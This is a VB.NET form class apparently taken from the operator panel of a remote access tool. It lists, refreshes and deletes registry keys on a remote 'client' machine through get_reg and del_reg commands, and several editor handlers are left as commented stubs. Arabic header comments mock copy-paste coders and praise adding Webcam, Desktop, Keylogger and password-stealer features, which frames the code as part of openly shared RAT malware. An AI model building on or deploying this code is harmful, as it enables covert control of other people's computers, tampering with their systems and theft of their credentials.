Public Class Registry_Editor
    '########################################################################################################
    '################## تحياتى للى داخلين مجال البرمجة و هم كل اللى يعرفوه نقطة فى داحل بحر من مبرمج صغير داخل شركة برمجة صغيرة 
    '############################################# تحيتاى لكل من ياخذ نسخ و لصق دون ذكر اى حقوق لصاحب المشروع  و من ثم يقنعوا انفسهم بانهم يفهموا 
    '########################################## تحيتاى لكل شخص يفتحلى فورم و فقط يقعد يلعب فيها و هو ولا فاهم هو بيعمل ايه 
    '################################  احب اقول كلمة لكل هؤلااء الاشخص اللى لا يضيفوا شىء بل يكون عبء على مجال البرمجة, انه فى الاخر بعد تعديله البضين فى هذا المشروع 
    'انه لن يعرف يضيف  اليه خواص جديدة و من ثم فقط انا قد تعلمت كل هذا بنفسى ليس من مشاهدة بل بالقراءة و الفهم و الفهم الجيد 
    'ليس من الجيد ان تقنع نفسك بانك تفهم السورس و بعدها تعدل بالوان بضان زيك و تكتب اسمك عليه 
    'لانه لا يهمنى انا شخصيا لانه اذا همنى ذلك لما كنت لانشر ذلك السورس 
    '########################################################################################################
    '#### تحياتى الحقيقة للمطورين و اقصد المطورين هم من يضيفوا خواص جديدة مثل Webcam , Desktop , Keylogger 
    'او حتى password stealer
    '##############################تحياتى الحقيقة للاشخاص المبدعين اللى يستطيعوا نشر السورس مع ذكر حقوق المبرمج 
    '############### و احب اقول ان لو غيرت الاسم دون تطوير لن يضرنى فقط سيضرك انت لانه ستزال جاهل ههههههههه و لن تطور فى تعليمك للبرمجة
    '
    '
    '
    '
    Public key As String
    Dim reg_key As String
    Protected Friend Sub Add_key(ByVal ke As String)
        ' To Avoid Calling from a Thread Exception if you are a Noob Leave it and don`t modify in it 
        If ke.Length > 0 Then : UpdataTreeView(ke, RGk, False) : RGk.SelectedNode.Expand() : RGk.Select() : RGk.Focus() : End If
    End Sub
    Delegate Sub DUpdateTreeView(keyname As String, tree As TreeView, clear As Boolean)
    Private Sub UpdataTreeView(keyname As String, tree As TreeView, clear As Boolean)
        If (tree.InvokeRequired) Then
            Dim d As DUpdateTreeView = New DUpdateTreeView(AddressOf UpdataTreeView)
            Me.Invoke(d, New Object() {keyname, tree, clear})
        Else
            If (clear) Then
                tree.Nodes.Clear()
            Else
                tree.SelectedNode.Nodes.Add(keyname)
            End If
        End If
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles RefreshToolStripMenuItem.Click
        If (Not Me.RGk.SelectedNode Is Nothing) Then
            Select Case RGk.SelectedNode.Text
                Case "HKEY_CLASSES_ROOT"
                    reg_key = "HKEY_CLASSES_ROOT"
                Case "HKEY_CURRENT_USER"
                    reg_key = "HKEY_CURRENT_USER"
                Case "HKEY_LOCAL_MACHINE"
                    reg_key = "HKEY_LOCAL_MACHINE"
                Case "HKEY_USERS"
                    reg_key = "HKEY_USERS"
                Case "HKEY_CURRENT_CONFIG"
                    reg_key = "HKEY_CURRENT_CONFIG"
            End Select
            Form1.Send_to_Client("get_reg" & FUNC.SPL & reg_key & FUNC.SPL & RGk.SelectedNode.FullPath.Replace(reg_key, "").TrimStart("\"), key)
            Me.RGLIST.Enabled = False
            Me.RGk.Enabled = False
        End If
    End Sub

    Private Sub DeleteKeyToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles DeleteKeyToolStripMenuItem.Click
        If (Not Me.RGk.SelectedNode Is Nothing) Then
            Dim fullPath As String = Me.RGk.SelectedNode.FullPath
            If fullPath.Contains("\") Then
                Dim str2 As String = Strings.Split(fullPath, "\", -1, CompareMethod.Binary)((Strings.Split(fullPath, "\", -1, CompareMethod.Binary).Length - 1))
                Dim str3 As String = ""
                Dim num2 As Integer = (Strings.Split(fullPath, "\", -1, CompareMethod.Binary).Length - 2)
                Dim i As Integer = 0
                Do While (i <= num2)
                    str3 = (str3 & Strings.Split(fullPath, "\", -1, CompareMethod.Binary)(i) & "\")
                    i += 1
                Loop
                Form1.Send_to_Client("del_reg" & FUNC.SPL & str3 & FUNC.SPL & str2 & FUNC.SPL, key) ' You Add this if you understand the code in client side
                Me.RGk.SelectedNode.Remove()
            End If
        End If
    End Sub

    Private Sub RefreshToolStripMenuItem1_Click(sender As System.Object, e As System.EventArgs) Handles RefreshToolStripMenuItem1.Click
        If (Not Me.RGk.SelectedNode Is Nothing) Then
            Select Case RGk.SelectedNode.Text
                Case "HKEY_CLASSES_ROOT"
                    reg_key = "HKEY_CLASSES_ROOT"
                Case "HKEY_CURRENT_USER"
                    reg_key = "HKEY_CURRENT_USER"
                Case "HKEY_LOCAL_MACHINE"
                    reg_key = "HKEY_LOCAL_MACHINE"
                Case "HKEY_USERS"
                    reg_key = "HKEY_USERS"
                Case "HKEY_CURRENT_CONFIG"
                    reg_key = "HKEY_CURRENT_CONFIG"
            End Select
            Form1.Send_to_Client("get_reg" & FUNC.SPL & reg_key & FUNC.SPL & RGk.SelectedNode.FullPath.Replace(reg_key, "").TrimStart("\"), key)
            Me.RGLIST.Enabled = False
            Me.RGk.Enabled = False
        End If
    End Sub

    Private Sub DeleteToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles DeleteToolStripMenuItem.Click
        Dim enumerator As IEnumerator
        Try
            enumerator = Me.RGLIST.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Form1.Send_to_Client("del_reg" & FUNC.SPL & RGk.SelectedNode.FullPath & FUNC.SPL & current.Text, key) ' You Add this if you understand the code in client side
            Loop
        Finally

        End Try
    End Sub
    Private Sub RGk_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles RGk.DoubleClick
        If (Not Me.RGk.SelectedNode Is Nothing) Then
            Select Case RGk.SelectedNode.Text
                Case "HKEY_CLASSES_ROOT"
                    reg_key = "HKEY_CLASSES_ROOT"
                Case "HKEY_CURRENT_USER"
                    reg_key = "HKEY_CURRENT_USER"
                Case "HKEY_LOCAL_MACHINE"
                    reg_key = "HKEY_LOCAL_MACHINE"
                Case "HKEY_USERS"
                    reg_key = "HKEY_USERS"
                Case "HKEY_CURRENT_CONFIG"
                    reg_key = "HKEY_CURRENT_CONFIG"
            End Select
            Form1.Send_to_Client("get_reg" & FUNC.SPL & reg_key & FUNC.SPL & RGk.SelectedNode.FullPath.Replace(reg_key, "").TrimStart("\"), key)
            Me.RGLIST.Enabled = False
        End If
    End Sub
    Private Sub RGk_AfterSelect(sender As System.Object, e As System.Windows.Forms.TreeViewEventArgs) Handles RGk.AfterSelect
        If (Not Me.RGk.SelectedNode Is Nothing) Then
            Select Case RGk.SelectedNode.Text
                Case "HKEY_CLASSES_ROOT"
                    reg_key = "HKEY_CLASSES_ROOT"
                Case "HKEY_CURRENT_USER"
                    reg_key = "HKEY_CURRENT_USER"
                Case "HKEY_LOCAL_MACHINE"
                    reg_key = "HKEY_LOCAL_MACHINE"
                Case "HKEY_USERS"
                    reg_key = "HKEY_USERS"
                Case "HKEY_CURRENT_CONFIG"
                    reg_key = "HKEY_CURRENT_CONFIG"
            End Select
            Form1.Send_to_Client("get_reg" & FUNC.SPL & reg_key & FUNC.SPL & RGk.SelectedNode.FullPath.Replace(reg_key, "").TrimStart("\"), key)
            Me.RGLIST.Enabled = False
        End If
    End Sub
    Private Sub RGLIST_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles RGLIST.DoubleClick
        If (Me.RGLIST.SelectedItems.Count <> 0) Then
            'Add them if you understood the code they are very easy 
            'NB : Don`t forget to add the handler on the client side too 
            Dim item As ListViewItem = Me.RGLIST.SelectedItems.Item(0)
            If item.ImageIndex = 1 Then
                'This is the Editor also
                ' You Complete Editor Form with this if you understand the code 
                'Dim gv As New Rgv
                'Try
                '    gv 
                'Catch exception1 As Exception
                '  MsgBox("Exception : " & exception1.Message)
                'End Try
                'gv.Text &= "Value STRING SZ"
                'gv.
                'gv.Show()
            ElseIf item.ImageIndex = 2 Then
                'This is the Editor also
                ' You Complete Editor Form with this if you understand the code 
                'Dim gv As New Rgv
                'Try
                '    gv 
                'Catch exception1 As Exception
                '  MsgBox("Exception : " & exception1.Message)
                'End Try
                'gv.Text &= "Value Binary"
                'gv.
                'gv.Show()
            End If



        End If
    End Sub


    Private Sub EditToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles EditToolStripMenuItem.Click
        If (Me.RGLIST.SelectedItems.Count <> 0) Then
            Dim item As ListViewItem = Me.RGLIST.SelectedItems.Item(0)
            'Add them if you understood the code they are very easy 
            'NB : Don`t forget to add the handler on the client side too 
            If item.ImageIndex = 1 Then
                'This is the Editor also
                ' You Complete Editor Form with this if you understand the code 
                'Dim gv As New Rgv
                'Try
                '    gv 
                'Catch exception1 As Exception
                '  MsgBox("Exception : " & exception1.Message)
                'End Try
                'gv.Text &= "Value STRING SZ"
                'gv.
                'gv.Show()
            ElseIf item.ImageIndex = 2 Then
                'This is the Editor also
                ' You Complete Editor Form with this if you understand the code 
                'Dim gv As New Rgv
                'Try
                '    gv 
                'Catch exception1 As Exception
                '  MsgBox("Exception : " & exception1.Message)
                'End Try
                'gv.Text &= "Value Binary"
                'gv.
                'gv.Show()
            End If



        End If
    End Sub

    Private Sub NewValueToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles NewValueToolStripMenuItem.Click
        'Add them if you understood the code they are very easy 
        'NB : Don`t forget to add the handler on the client side too 
        'This is the Editor also
        ' You Complete Editor Form with this if you understand the code 
        'Dim gv As New Rgv
        'Try
        '    gv 
        'Catch exception1 As Exception
        '  MsgBox("Exception : " & exception1.Message)
        'End Try
        'gv.Text = "Add New Value"
        'gv.
        'gv.Show()
    End Sub

    Private Sub CreateKeyToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles CreateKeyToolStripMenuItem.Click
        'Add them if you understood the code they are very easy 
        'NB : Don`t forget to add the handler on the client side too 
        'This is the Editor also
        ' You Complete Editor Form with this if you understand the code 
        'Dim gv As New Rgv
        'Try
        '    gv 
        'Catch exception1 As Exception
        '  MsgBox("Exception : " & exception1.Message)
        'End Try
        'gv.Text = "Add New Key"
        'gv.
        'gv.Show()
    End Sub
End Class